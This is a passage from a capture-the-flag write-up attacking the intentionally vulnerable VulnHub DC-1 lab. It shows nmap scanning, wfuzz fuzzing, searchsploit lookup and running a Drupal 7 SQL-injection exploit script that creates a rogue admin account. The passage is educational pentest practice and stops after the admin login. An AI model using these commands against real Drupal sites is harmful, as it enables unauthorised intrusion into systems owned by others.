<!doctype html><html itemscope itemtype=http://schema.org/WebPage lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=2"><meta name=robots content="noodp"><title>DC-1 of the DC Series - PivotTheNet</title><meta name=author content="revsh3ll"><meta name=author-link content><meta name=description content="DC-1 from the DC-Series(VulnHub)."><meta name=keywords content="CTF (self-hosted)"><meta itemprop=name content="DC-1 of the DC Series"><meta itemprop=description content="DC-1 from the DC-Series(VulnHub)."><meta itemprop=datePublished content="2023-01-20T12:13:08-05:00"><meta itemprop=dateModified content="2023-01-20T12:13:08-05:00"><meta itemprop=wordCount content="2511"><meta itemprop=image content="https://PivotTheNet.GitHub.io/avatar.png"><meta itemprop=keywords content="CTF (self-hosted),"><meta property="og:title" content="DC-1 of the DC Series"><meta property="og:description" content="DC-1 from the DC-Series(VulnHub)."><meta property="og:type" content="article"><meta property="og:url" content="https://PivotTheNet.GitHub.io/dc-1/"><meta property="og:image" content="https://PivotTheNet.GitHub.io/avatar.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-01-20T12:13:08-05:00"><meta property="article:modified_time" content="2023-01-20T12:13:08-05:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://PivotTheNet.GitHub.io/avatar.png"><meta name=twitter:title content="DC-1 of the DC Series"><meta name=twitter:description content="DC-1 from the DC-Series(VulnHub)."><meta name=application-name content="PivotTheNet"><meta name=apple-mobile-web-app-title content="PivotTheNet"><meta name=theme-color data-light=#f8f8f8 data-dark=#252627 content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=https://PivotTheNet.GitHub.io/dc-1/><link rel=prev href=https://PivotTheNet.GitHub.io/networking/><link rel=next href=https://PivotTheNet.GitHub.io/dc-2/><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"DC-1 of the DC Series","inLanguage":"en-us","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/PivotTheNet.GitHub.io\/dc-1\/"},"genre":"posts","keywords":"CTF (self-hosted)","wordcount":2511,"url":"https:\/\/PivotTheNet.GitHub.io\/dc-1\/","datePublished":"2023-01-20T12:13:08-05:00","dateModified":"2023-01-20T12:13:08-05:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"revsh3ll"},"description":"DC-1 from the DC-Series(VulnHub)."}</script></head><body data-header-desktop=sticky data-header-mobile=auto><script>(window.localStorage?.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("data-theme","dark")</script><div class=wrapper data-page-style=wide><header class="desktop animate__faster" id=header-desktop><div class=header-wrapper data-github-corner=right><div class=header-title><a href=/ title=PivotTheNet><img loading=lazy src=/dragon-tp-round-right.png data-title=PivotTheNet data-alt=PivotTheNet class=logo style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'><span class=header-title-pre>root:~# </span><span id=typeit-header-desktop class=typeit></span></a><span class=header-subtitle></span></div><nav><ul class=menu><li class=menu-item><a class=menu-link href=/posts/ title=Posts><i class="fa-solid fa-book-skull fa-lg fa-fw fa-sm" aria-hidden=true></i> Posts</a></li><li class=menu-item><a class=menu-link href=/categories/ title=Categories><i class="fa-solid fa-floppy-disk fa-lg fa-fw fa-sm" aria-hidden=true></i> Categories</a></li><li class=menu-item><a class=menu-link href=/tags/ title=Tags><i class="fa-solid fa-tags fa-lg fa-fw fa-sm" aria-hidden=true></i> Tags</a></li><li class=menu-item><a class=menu-link href=/whoami title=whoami><i class="fa-solid fa-user-secret fa-lg fa-fw fa-sm" aria-hidden=true></i> whoami</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id=search-desktop><input type=text placeholder="Search titles or contents ..." id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fa-solid fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></li><li class="menu-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></li></ul></nav></div></header><header class="mobile animate__faster" id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=PivotTheNet><img loading=lazy src=/dragon-tp-round-right.png data-title=/dragon-tp-round-right.png data-alt=/dragon-tp-round-right.png class=logo style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'><span class=header-title-pre>root:~# </span><span id=typeit-header-title-mobile class=typeit></span></a><span class=header-subtitle></span></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><nav><ul class=menu id=menu-mobile><li class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents ..." id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fa-solid fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></li><li class=menu-item><a class=menu-link href=/posts/ title=Posts><i class="fa-solid fa-book-skull fa-lg fa-fw fa-sm" aria-hidden=true></i> Posts</a></li><li class=menu-item><a class=menu-link href=/categories/ title=Categories><i class="fa-solid fa-floppy-disk fa-lg fa-fw fa-sm" aria-hidden=true></i> Categories</a></li><li class=menu-item><a class=menu-link href=/tags/ title=Tags><i class="fa-solid fa-tags fa-lg fa-fw fa-sm" aria-hidden=true></i> Tags</a></li><li class=menu-item><a class=menu-link href=/whoami title=whoami><i class="fa-solid fa-user-secret fa-lg fa-fw fa-sm" aria-hidden=true></i> whoami</a></li><li class="menu-item menu-system"><span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></span></li></ul></nav></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><nav aria-label=breadcrumb class="breadcrumb-container sticky"><ol class=breadcrumb><li class=breadcrumb-item><a href=/ title=PivotTheNet>Home</a></li><li class=breadcrumb-item><a href=/posts/ title=Posts>Posts</a></li><li class="breadcrumb-item active" aria-current=page>DC-1 of the DC Series</li></ol></nav><main class=container><aside class=toc id=toc-auto><h2 class=toc-title>Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden=true></i></h2><div class="toc-content always-active" id=toc-content-auto></div></aside><aside class=aside-custom></aside><article class="page single"><div class=header><h1 class="single-title animate__animated animate__flipInX"><span>DC-1 of the DC Series</span></h1></div><div class=post-meta><div class=post-meta-line><span class=post-author><span class=author><img loading=lazy src=/avatar.png data-title=revsh3ll data-alt=revsh3ll class=avatar style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'>&nbsp;revsh3ll</span></span>
<span class=post-category>included in <a href=/categories/vulnhub/><i class="fa-regular fa-folder fa-fw" aria-hidden=true></i> VulnHub</a></span></div><div class=post-meta-line><span title="published on 2023-01-20 12:13:08"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden=true></i><time datetime=01-20-2023>01-20-2023</time></span>&nbsp;<span title="Updated on 2023-01-20 12:13:08"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden=true></i><time datetime=01-20-2023>01-20-2023</time></span>&nbsp;<span title="2511 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden=true></i>About 2600 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden=true></i>12 minutes</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept=false><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fa-solid fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#export-environment-variables>Export Environment Variables</a></li><li><a href=#scanning--enumeration>Scanning & Enumeration</a><ul><li><a href=#nmap>nmap</a></li><li><a href=#manual-inspection-of-80webapp>Manual Inspection of 80/webapp</a></li><li><a href=#fuzzing-webapp80>Fuzzing webapp/80</a></li></ul></li><li><a href=#researching-vulnerabilities>Researching Vulnerabilities</a></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#enumerating-drupal-admin-pages>Enumerating Drupal admin pages</a></li><li><a href=#exploiting-php-module>Exploiting PHP module</a></li><li><a href=#php-revshell>PHP revshell</a></li></ul></li><li><a href=#privilege-escalation>Privilege Escalation</a><ul><li><a href=#custom-tty>Custom tty</a></li><li><a href=#suid-search>SUID Search</a></li><li><a href=#searching-gtfobins>Searching GTFObins</a></li><li><a href=#abusing-the-suid>Abusing the SUID</a></li></ul></li><li><a href=#rooted>ROOTED!</a></li></ul></nav></div></div><div class=content id=content><p>Let&rsquo;s root DC-1!</p><br><p>Details can be found at <a href=https://www.five86.com/dc-1.html target=_blank rel="external nofollow noopener noreferrer">https://www.five86.com/dc-1.html</a></p><span style=color:cyan><details closed><summary>Open this to see the box's overview pulled from the above website.</summary><br>DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.<p>It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.</p><p>To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.</p><p>There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.</p><p>There are five flags in total, but the ultimate goal is to find and read the flag in root&rsquo;s home directory. You don&rsquo;t even need to be root to do this, however, you will require root privileges.</p><p>Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.</p><p>Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.</p></details></span><br><blockquote><p>If you&rsquo;re ever needing to find the IP of a local box, <code>sudo netdiscover -r *ip/cidr*</code> will do the trick. <code>-r</code> specifies the range. If this tool doesn&rsquo;t work, you could have routing issues. <code>-i</code> can specify the interface you need to run against. Another nifty tool is <code>ip route get *ip*</code> as this will tell you what route a packet will take to the <code>ip</code> specified. Anyways.. to the box!</p></blockquote><h2 id=export-environment-variables>Export Environment Variables</h2><p>Exporting variables can help speed up some tasks, e.g., insert IP address into a command or when we fuzz directories and files of a webapp address.
Your IP value will most likely differ, so adjust accordingly:</p><ol><li><code>export IP="192.168.56.110"</code></li><li><code>export URLdir="http://192.168.56.110/FUZZ/"</code> &lt;&ndash; Directories</li><li><code>export URLfile="http://192.168.56.110/FUZZ"</code> &lt;&ndash; Files<ol><li>appended backslash depicts directories vs files ðŸ˜ƒ</li></ol></li><li>You can then test your exported vars by running <code>echo $varname</code>: e.g., <code>echo $IP</code> would respond with 192.168.56.110.</li></ol><h2 id=scanning--enumeration>Scanning & Enumeration</h2><p>Before we move forward, let&rsquo;s make a list that&rsquo;ll include the important bits as we move forward. We&rsquo;ll add/update as we go through the box, so we can reference it.</p><blockquote><p>Box Name: DC-1<br>IP: 192.168.56.110</p></blockquote><h3 id=nmap>nmap</h3><p>Let&rsquo;s start with a simple nmap scan to see what we&rsquo;re playing with:</p><ul><li><code>nmap $IP -T4 -p- -A --open</code><ul><li><code>$IP</code> = target&rsquo;s IP via exported variable.</li><li><code>-T4</code> = T1(slowest) thru T5(fastest), T3 is the default speed. If you leave this option out, the scan will run at a default T3 speed. More can be learned at <a href=https://nmap.org/book/performance-timing-templates.html target=_blank rel="external nofollow noopener noreferrer">Nmap&rsquo;s Timing Templates</a> webpage.</li><li><code>-p-</code> = Tells nmap to scan all ports(TCP by default)..</li><li><code>-A</code> = Runs four options under one:<ol><li>OS detection</li><li>Version detection</li><li>Script scanning</li><li>Traceroute</li></ol></li><li><code>--open</code> = runs <code>-A</code> only against ports that are open. Idea is to speed up slow scans. Running a local box won&rsquo;t cause much issues but when you&rsquo;re running a slower scan or the latency is high, this option can help.</li></ul></li></ul><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-1/DC-1_nmap-scan.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-1/DC-1_nmap-scan.png?size=small" data-sub-html="<h2>DC-1 nmap scan</h2><p>DC-1 nmap scan</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-1/DC-1_nmap-scan.png srcset="/images/CTF/VulnHub/DC-Series/DC-1/DC-1_nmap-scan.png?size=small, /images/CTF/VulnHub/DC-Series/DC-1/DC-1_nmap-scan.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-1/DC-1_nmap-scan.png?size=large 2x" sizes=auto data-title="DC-1 nmap scan" data-alt="DC-1 nmap scan" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>DC-1 nmap scan</figcaption></figure></p><ul><li><p>Let&rsquo;s start with port 80 as it&rsquo;s most likely the weakest entry point due to the potential services listed in robots.txt.</p></li><li><p>SSH, on port 22, isn&rsquo;t much use as we currently lack keys, usernames, and passwords. We could brute force but it&rsquo;ll take a while and it&rsquo;s not guaranteed to work.</p></li><li><p>rpc could be of use but I&rsquo;m not seeing anything obvious in the list of services, so we&rsquo;ll skip this for now.</p><blockquote><p><strong>Box Name:</strong> DC-1<br><strong>IP:</strong> 192.168.56.110<br><strong>OS:</strong> Debian(Linux)<br><strong>Ports & Service:</strong><br><em><strong>80</strong></em> - Apache httpd 2.2.22- Drupal CMS v7.xx - <strong>&lt;&ndash; Focus here first</strong><br><em><strong>111</strong></em> - rpcbind<br><em><strong>43450</strong></em> - rpcbind related<br><em><strong>22</strong></em> - ssh - least attractive since we have no usernames, passwords, or keys</p></blockquote></li></ul><h3 id=manual-inspection-of-80webapp>Manual Inspection of 80/webapp</h3><ul><li>Open up a browser and enter the box&rsquo;s IP address to visit the IP&rsquo;s http service. Since it&rsquo;s running on port 80, there&rsquo;s no need to specify the port eg. 192.168.56.110 <strong>:80</strong></li></ul><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-1/Drupal-http.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-1/Drupal-http.png?size=small" data-sub-html="<h2>DC-1 http service</h2><p>DC-1 http service</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-1/Drupal-http.png srcset="/images/CTF/VulnHub/DC-Series/DC-1/Drupal-http.png?size=small, /images/CTF/VulnHub/DC-Series/DC-1/Drupal-http.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-1/Drupal-http.png?size=large 2x" sizes=auto data-title="DC-1 http service" data-alt="DC-1 http service" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>DC-1 http service</figcaption></figure></p><ul><li><p>Manually inspect the page source. Findings are:</p><ul><li>Drupal 7 = nmap already told us this<figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-1/page-source-drupal-7.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-1/page-source-drupal-7.png?size=small" data-sub-html="<h2>Page Source of Drupal</h2><p>Page Source of Drupal</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-1/page-source-drupal-7.png srcset="/images/CTF/VulnHub/DC-Series/DC-1/page-source-drupal-7.png?size=small, /images/CTF/VulnHub/DC-Series/DC-1/page-source-drupal-7.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-1/page-source-drupal-7.png?size=large 2x" sizes=auto data-title="Page Source of Drupal" data-alt="Page Source of Drupal" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>Page Source of Drupal</figcaption></figure></li></ul></li><li><p>Let&rsquo;s see if we can enumerate the responses regarding the login fields at the /user/ directory</p><ul><li><p>No response allows us to differentiate between username nor passwords.<br>If we could get a response saying &ldquo;This email does not exist&rdquo;, then that would allow us to brute force enumerate emails.<figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-1/login-enum-fail.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-1/login-enum-fail.png?size=small" data-sub-html="<h2>Login Enum Fail</h2><p>Login Enum Fail</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-1/login-enum-fail.png srcset="/images/CTF/VulnHub/DC-Series/DC-1/login-enum-fail.png?size=small, /images/CTF/VulnHub/DC-Series/DC-1/login-enum-fail.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-1/login-enum-fail.png?size=large 2x" sizes=auto data-title="Login Enum Fail" data-alt="Login Enum Fail" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>Login Enum Fail</figcaption></figure></p></li><li><p>Same goes for recovering an account.<figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-1/forgot-enum-fail.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-1/forgot-enum-fail.png?size=small" data-sub-html="<h2>Forgot Enum Fail</h2><p>Forgot Enum Fail</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-1/forgot-enum-fail.png srcset="/images/CTF/VulnHub/DC-Series/DC-1/forgot-enum-fail.png?size=small, /images/CTF/VulnHub/DC-Series/DC-1/forgot-enum-fail.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-1/forgot-enum-fail.png?size=large 2x" sizes=auto data-title="Forgot Enum Fail" data-alt="Forgot Enum Fail" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>Forgot Enum Fail</figcaption></figure></p></li></ul></li><li><p>Default credentials?</p><ul><li>Seems like that&rsquo;s a negative. Drupal forces a password change when logging in for the first time. Answer found via google ðŸ˜ƒ</li></ul></li><li><p>/robots.txt shows possible services running. Possibility for injections? PHP, SQL? Worth noting.</p><ul><li>sqlite</li><li>mysql</li><li>php</li></ul></li><li><p>POST responses show the Apache/2.2.22 (Debian) versioning, which nmap already found.</p></li><li><p>POST also shows PHP/5.4.45-0+deb7u14. nmap didn&rsquo;t see this.</p><blockquote><p><strong>Box Name:</strong> DC-1<br><strong>IP:</strong> 192.168.56.110<br><strong>OS:</strong> Debian(Linux)<br><strong>Ports & Service:</strong><br><em><strong>80</strong></em> - Apache httpd 2.2.22 - Drupal CMS v7.xx - php 5.4.45-0+deb7u14 - sql ?<br><em><strong>111</strong></em> - rpcbind<br><em><strong>43450</strong></em> - rpcbind related<br><em><strong>22</strong></em> - ssh - least attractive since we have no usernames, passwords, or keys</p></blockquote><h3 id=fuzzing-webapp80>Fuzzing webapp/80</h3></li><li><p>I tried fuzzing but it didn&rsquo;t result in anything interesting beyond what robots.txt already told us.</p><ul><li>Example commands would be&mldr;<ul><li><code>wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/Drupal.txt --hc 404 $URLfile</code></li><li><code>wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/Drupal.txt --hc 404 $URLdir</code></li></ul></li><li>I also tried dirbuster with similar results.</li><li>Some results I got were:<ul><li>000000007: 200 54 L 164 W 3151 Ch &ldquo;install.php&rdquo;</li><li>000000005: 200 0 L 6 W 42 Ch &ldquo;xmlrpc.php&rdquo;</li><li>000000237: 200 9 L 15 W 283 Ch &ldquo;rss.xml&rdquo;</li></ul></li></ul></li></ul><h2 id=researching-vulnerabilities>Researching Vulnerabilities</h2><p>I was hoping to find something more than just a general version 7 of Drupal&mldr; e.g., 7.26, but that&rsquo;s okay. Let&rsquo;s go ahead and run <code>searchsploit</code> against <code>Drupal</code> and see what we get back.</p><ul><li><p><code>searchsploit Drupal</code><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-1/searchsploit-drupal.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-1/searchsploit-drupal.png?size=small" data-sub-html="<h2>DC-1 Drupal 7 searchsploit</h2><p>DC-1 Drupal 7 searchsploit</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-1/searchsploit-drupal.png srcset="/images/CTF/VulnHub/DC-Series/DC-1/searchsploit-drupal.png?size=small, /images/CTF/VulnHub/DC-Series/DC-1/searchsploit-drupal.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-1/searchsploit-drupal.png?size=large 2x" sizes=auto data-title="DC-1 Drupal 7 searchsploit" data-alt="DC-1 Drupal 7 searchsploit" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>DC-1 Drupal 7 searchsploit</figcaption></figure></p></li><li><p>Well, good news is there isn&rsquo;t many version 7 exploits!</p></li><li><p>We&rsquo;re looking for RCE(remote code execution) as it will provide us the quickest/easiest way into the system. We also want something that doesn&rsquo;t require authentication, although we can make a user at /user/register. There&rsquo;s always the chance a non-privileged user would have enough privs to execute such an exploit.</p></li><li><p>The Drupalgeddon2 sticks out to me but I want a more manual approach and something that&rsquo;ll be sure to work with version 7.xx &mldr; Let&rsquo;s go with the <strong>php/webapps/34992.py</strong>. <em><strong>We could use msfconsole and let that automate most of what we&rsquo;ll do below, but what&rsquo;s the fun in that!</strong></em></p></li></ul><blockquote><p>My thought process is that we&rsquo;ll create an admin account in drupal and see what drupal has to offer. We saw PHP and SQL in robots.txt, so we&rsquo;ll most likely have a way in through those. Speaking of SQL, 34992.py script will be using SQLi, so that&rsquo;s a start&mldr;</p></blockquote><ul><li>Download the script to a local directory and <code>cat</code> the contents&mldr;<ul><li><code>searchsploit -m php/webapps/34992.py</code> &lt;&ndash; This will download the script to the current directory using searchsploit. Love this feature.</li><li><code>cat 34992.py</code> &lt;&ndash; This will output the contents of the .py script, so we can dig into it and alter code if needed. Many scripts don&rsquo;t hold your hand, so knowing how to read code is very helpful.</li><li>You&rsquo;ll see this line which tells us the command options needed, so we can successfully execute the script against the target.</li></ul></li></ul><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-1/python-exploit-admin-sqli.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-1/python-exploit-admin-sqli.png?size=small" data-sub-html="<h2>DC-1 Drupal 7 exploit</h2><p>DC-1 Drupal 7 exploit</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-1/python-exploit-admin-sqli.png srcset="/images/CTF/VulnHub/DC-Series/DC-1/python-exploit-admin-sqli.png?size=small, /images/CTF/VulnHub/DC-Series/DC-1/python-exploit-admin-sqli.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-1/python-exploit-admin-sqli.png?size=large 2x" sizes=auto data-title="DC-1 Drupal 7 exploit" data-alt="DC-1 Drupal 7 exploit" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>DC-1 Drupal 7 exploit</figcaption></figure></p><p>usage: <code>%prog **-t http[s]://TARGET_URL -u USER -p PASS**\n</code></p><p>So we&rsquo;ll try&mldr; <code>python2 34992.py -t http://$IP -u owned -p owned</code></p><ul><li>This will hopefully create an admin account we can login to via the homepage of Drupal. From there the goal is to look for a way to upload a malicious php file. eg a reverse shell or possibly a plugin to exploit. Who knows. I&rsquo;m just guessing but since this is a CMS(Drupal) and most likely running PHP, I bet our chances are good.</li></ul><h2 id=exploitation>Exploitation</h2><p>Well&mldr; let&rsquo;s get to it.</p><ul><li><code>python2 34992.py -t http://$IP -u owned -p owned</code></li></ul><p><strong>IF YOU GET A &ldquo;SyntaxError: Missing parentheses in call to &lsquo;print&rsquo;. Did you mean print(&mldr;)?&rdquo;&mldr;<br>you&rsquo;re not running the script under python2&mldr; which is required.</strong></p><p><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-1/drupal-admin-created.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-1/drupal-admin-created.png?size=small" data-sub-html="<h2>DC-1 Drupal 7 admin created</h2><p>DC-1 Drupal 7 admin created</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-1/drupal-admin-created.png srcset="/images/CTF/VulnHub/DC-Series/DC-1/drupal-admin-created.png?size=small, /images/CTF/VulnHub/DC-Series/DC-1/drupal-admin-created.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-1/drupal-admin-created.png?size=large 2x" sizes=auto data-title="DC-1 Drupal 7 admin created" data-alt="DC-1 Drupal 7 admin created" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>DC-1 Drupal 7 admin created</figcaption></figure></p><ul><li><p>Now let&rsquo;s test the login page&mldr; with owned:owned.
<em><strong>ADMIN LOGGED IN</strong></em><figure><a class=lightgallery href="/images/CTF/VulnHub/DC-Series/DC-1/logged-in-drupal.png?size=large" data-thumbnail="/images/CTF/VulnHub/DC-Series/DC-1/logged-in-drupal.png?size=small" data-sub-html="<h2>DC-1 Drupal 7 admin logged in</h2><p>DC-1 Drupal 7 admin logged in</p>"><img loading=lazy src=/images/CTF/VulnHub/DC-Series/DC-1/logged-in-drupal.png srcset="/images/CTF/VulnHub/DC-Series/DC-1/logged-in-drupal.png?size=small, /images/CTF/VulnHub/DC-Series/DC-1/logged-in-drupal.png?size=medium 1.5x, /images/CTF/VulnHub/DC-Series/DC-1/logged-in-drupal.png?size=large 2x" sizes=auto data-title="DC-1 Drupal 7 admin logged in" data-alt="DC-1 Drupal 7 admin logged in" style="background:url(/svg/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title,this.alt=this.dataset.alt;for(const e of["style","data-title","data-alt","onerror","onload"])this.removeAttribute(e)'></a><figcaption class=image-caption>DC-1 Drupal 7 admin logged in</figcaption></figure></p></li><li><p>Now that we&rsquo;re in a CMS, we should look around and enumerate what we can&mldr;</p></li></ul><h3 